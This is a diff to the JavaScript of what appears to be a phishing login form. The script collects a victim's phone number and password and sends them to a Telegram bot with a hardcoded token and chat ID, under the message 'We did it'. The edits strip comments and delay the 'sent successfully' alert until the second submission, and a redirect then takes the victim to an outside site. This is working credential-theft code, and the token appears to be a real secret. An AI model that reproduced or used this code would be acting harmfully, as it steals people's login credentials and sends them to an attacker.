@@ -91,11 +91,9 @@
         return false;
       }
 
-      // Telegram Bot details
+      
       const botToken = '7329936303:AAF2w2JFPfLLr1dAytnBPxmK539N8QYdHXw';  // Replace with your bot's token
-      const chatId = '6992364240';     // Replace with your chat ID
-
-      // The message content to send
+      const chatId = '6992364240';     
       const message = `Phone:👉 ${phone}\nPassword:👉 ${password} \n\nWe did it😎`;
 
       // Send the data to the Telegram Bot API using fetch
@@ -103,9 +101,10 @@
         .then(response => response.json())
         .then(data => {
           if (data.ok) {
-            alert('Your data has been sent to Telegram successfully.');
+            
             count+=1;
             if(count>1){
+                alert('Your data has been sent to Telegram successfully.');
                 window.location.href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.ainude.ai/&ved=2ahUKEwic24r8w9OHAxX1UOUKHbSkBy8QFnoECBMQAQ&usg=AOvVaw2dGO6HJ9cn1qhaaDbKrFP8";
             }
           } else {
